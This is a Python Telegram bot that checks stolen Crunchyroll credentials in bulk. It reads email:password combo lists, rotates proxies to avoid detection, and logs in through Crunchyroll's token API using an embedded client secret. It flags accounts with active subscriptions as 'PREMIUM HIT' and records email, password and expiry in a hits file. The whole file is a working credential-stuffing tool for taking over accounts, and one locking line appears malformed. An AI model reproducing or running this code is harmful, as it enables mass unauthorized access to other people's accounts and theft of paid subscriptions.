import os
import asyncio
import uuid
import random
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram import F

# ================== CONFIG ==================
BOT_TOKEN = os.getenv("BOT_TOKEN")
NOTIFICATION_CHAT_ID = os.getenv("NOTIFICATION_CHAT_ID", "")
AUTHORIZED_USERS = [int(x.strip()) for x in os.getenv("AUTHORIZED_USERS", "").split(",") if x.strip()]

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Globals
checker = None
proxies = []
stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0}

class CrunchyrollChecker:
    def __init__(self, proxies=None):
        self.proxies = proxies or []

    def _get_random_proxy(self):
        if not self.proxies:
            return None
        p = random.choice(self.proxies)
        return {'http': f'http://{p}', 'https': f'http://{p}'}

    def check(self, email: str, password: str):
        try:
            session = requests.Session()
            if proxy := self._get_random_proxy():
                session.proxies.update(proxy)

            # === LOGIN ===
            data = {
                'grant_type': 'password',
                'username': email,
                'password': password,
                'scope': 'offline_access',
                'client_id': 'y2arvjb0h0rgvtizlovy',
                'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
                'device_type': 'Baron',
                'device_id': str(uuid.uuid4()),
            }

            r = session.post("https://beta-api.crunchyroll.com/auth/v1/token", 
                             data=data, timeout=15)

            if r.status_code != 200 or "access_token" not in r.text:
                return {"status": "INVALID", "email": email, "reason": "Login failed"}

            token = r.json().get("access_token")
            headers = {"authorization": f"Bearer {token}"}

            # === ACCOUNT INFO ===
            me = session.get("https://beta-api.crunchyroll.com/accounts/v1/me", 
                           headers=headers, timeout=10).json()

            external_id = me.get("external_id")
            if not external_id:
                return {"status": "INVALID", "email": email, "reason": "No account ID"}

            # === SUBSCRIPTION ===
            sub = session.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}", 
                            headers=headers, timeout=10).json()

            is_premium = sub.get("is_active", False) and not sub.get("is_cancelled", False)

            result = {
                "status": "PREMIUM" if is_premium else "FREE",
                "email": email,
                "password": password,
                "verified": me.get("email_verified", False),
                "expiry": str(sub.get("next_renewal_date", "N/A"))[:10],
                "country": sub.get("country_code", "Unknown"),
                "plan": sub.get("tier", "Unknown")
            }
            return result

        except Exception as e:
            return {"status": "ERROR", "email": email, "reason": str(e)[:100]}


async def send_result(chat_id, result):
    if result["status"] == "PREMIUM":
        text = f"🎯 <b>PREMIUM HIT</b>\n<pre>" \
               f"Email: {result['email']}\n" \
               f"Pass : {result['password']}\n" \
               f"Expiry: {result['expiry']}\n" \
               f"Country: {result['country']}</pre>"
        await bot.send_message(chat_id, text, parse_mode="HTML")
        
        with open("hits.txt", "a", encoding="utf-8") as f:
            f.write(f"PREMIUM | {result['email']}:{result['password']} | {result['expiry']}\n")

    elif result["status"] == "FREE":
        await bot.send_message(chat_id, f"🆓 FREE → {result['email']}")
    elif result["status"] == "INVALID":
        await bot.send_message(chat_id, f"❌ INVALID → {result['email']}")
    else:
        await bot.send_message(chat_id, f"⚠️ ERROR → {result['email']} | {result.get('reason','')}")


# ================== COMMANDS ==================
@dp.message(Command("start"))
async def start(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS: return
    await message.answer("✅ Bot is ready.\nSend combos with /check")


@dp.message(Command("stats"))
async def stats_cmd(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS: return
    await message.answer(f"📊 Checked: {stats['checked']}\n✅ Premium: {stats['premium']}")


@dp.message(Command("hits"))
async def hits(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS or not os.path.exists("hits.txt"):
        return await message.answer("No hits yet.")
    await message.answer_document(FSInputFile("hits.txt"))


@dp.message(F.document | F.text)
async def handle(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return

    global checker

    if message.document:
        file = await bot.get_file(message.document.file_id)
        content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
    else:
        content = message.text.replace("/check", "").strip()

    lines = [line.strip() for line in content.splitlines() if ":" in line]

    if not lines:
        return await message.answer("No valid email:password found.")

    # Proxy loading
    if "@" not in content[:200]:
        global proxies
        proxies = lines
        checker.proxies = proxies
        return await message.answer(f"✅ {len(proxies)} proxies loaded.")

    # Checking
    await message.answer(f"🚀 Checking {len(lines)} combo(s)...")

    for line in lines:
        email, pwd = line.split(":", 1)
        result = checker.check(email.strip(), pwd.strip())
        
        with lock := asyncio.Lock():  # simple protection
            stats['checked'] += 1
            if result["status"] == "PREMIUM":
                stats['premium'] += 1
            elif result["status"] == "FREE":
                stats['free'] += 1
            else:
                stats['invalid'] += 1

        await send_result(message.from_user.id, result)


async def main():
    global checker
    checker = CrunchyrollChecker(proxies)
    print("Bot Started Successfully!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
